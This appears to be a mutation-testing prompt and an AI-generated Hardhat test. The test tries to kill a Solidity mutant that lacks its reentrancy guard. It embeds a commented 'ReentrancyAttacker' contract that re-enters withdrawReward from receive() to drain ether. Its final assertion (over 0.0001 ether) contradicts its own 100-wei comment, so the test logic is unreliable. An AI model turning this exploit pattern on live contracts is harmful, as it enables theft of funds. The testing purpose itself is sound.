@@ -1,0 +1,88 @@
+Task: Derive a test case to kill the live Solidity mutant just like a senior test automation engineer would.
+
+Instructions:
+    1 - Generate the Test: Based on the previous hypothesis, you must generate a test case to kill mutant m8ead4462 of Reentrancy_bonus.
+        Requirements:       
+        - You must generate a single HardHat test case in Typescript that directly tests the mutant.
+        - The test case should be included in a test file with all all necessary imports, setups, and hooks to ensure it can run as-is. 
+        - You must use the provided Reference Test Suite Setup as a reference for generating the new test case.
+        - Do not use mocks, placeholders or undefined variables, and do not call functions or other elements that do not exist in the smart contract under test Reentrancy_bonus.
+        - Pay attention to the syntax of the generated code, avoiding Solidity syntax errors.
+    First think step-by-step, look at the differences between the original and the mutant, consider the hypothesis, and then generate a test case that should be able to detect the mutant.
+
+Reference Test Suite Setup for Reentrancy_bonus:
+        Test Suite Setup: import { expect } from "chai"; import { ethers } from "hardhat"; describe("Reentrancy_bonus reference (ethers v6; deploy may require constructor arguments)", function () { it("deploy Reentrancy_bonus by supplying its REQUIRED constructor arguments (read them from the contract constructor), then call methods and assert; use ethers.parseEther, await (await tx).wait(), and expect(...).to.be.reverted", async function () { const [owner, addr1, addr2] = await ethers.getSigners(); const Factory = await ethers.getContractFactory("Reentrancy_bonus"); const instance = await Factory.deploy(...constructorArgs); await instance.waitForDeployment(); }); });
+
+Output Format:
+    Provide your experiment code within the \'```typescript\' and \'```\' markers, without any additional text.
+
+```typescript
+import { expect } from "chai";
+import { ethers } from "hardhat";
+
+describe("Reentrancy_bonus mutant m8ead4462 - detect removed reentrancy guard", function () {
+  it("should allow reentrancy attack when _nonReentrant modifier is removed", async function () {
+    const [owner, attacker] = await ethers.getSigners();
+    
+    // Deploy the target contract (no constructor arguments needed)
+    const Reentrancy_bonus = await ethers.getContractFactory("Reentrancy_bonus");
+    const target = await Reentrancy_bonus.deploy();
+    await target.waitForDeployment();
+    
+    // Deploy attacker contract
+    const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
+    const attackerContract = await Attacker.deploy(await target.getAddress());
+    await attackerContract.waitForDeployment();
+    
+    // Fund the target contract with some ether for withdrawals
+    await owner.sendTransaction({
+      to: await target.getAddress(),
+      value: ethers.parseEther("10")
+    });
+    
+    // First, call getFirstWithdrawalBonus to set up rewards for the attacker
+    await target.connect(attacker).getFirstWithdrawalBonus(await attackerContract.getAddress());
+    
+    // Now trigger the reentrancy attack
+    const tx = await attackerContract.connect(attacker).attack();
+    
+    // The attack should succeed (mutant) - check that attacker drained more than intended
+    await expect(tx).to.not.be.reverted;
+    
+    // Verify the attacker contract received more than the initial 100 wei bonus
+    const attackerBalance = await ethers.provider.getBalance(await attackerContract.getAddress());
+    expect(attackerBalance).to.be.gt(ethers.parseEther("0.0001")); // More than just the bonus
+  });
+});
+
+// Helper attacker contract (deployed as separate contract)
+// This needs to be in a separate file: contracts/ReentrancyAttacker.sol
+/*
+pragma solidity ^0.8.0;
+
+interface ITarget {
+    function withdrawReward(address recipient) external;
+    function getFirstWithdrawalBonus(address recipient) external;
+}
+
+contract ReentrancyAttacker {
+    ITarget public target;
+    uint public attackCount;
+    
+    constructor(address _target) {
+        target = ITarget(_target);
+    }
+    
+    function attack() external {
+        target.withdrawReward(address(this));
+    }
+    
+    receive() external payable {
+        if (attackCount < 3) {
+            attackCount++;
+            target.withdrawReward(address(this));
+        }
+    }
+}
+*/
+```
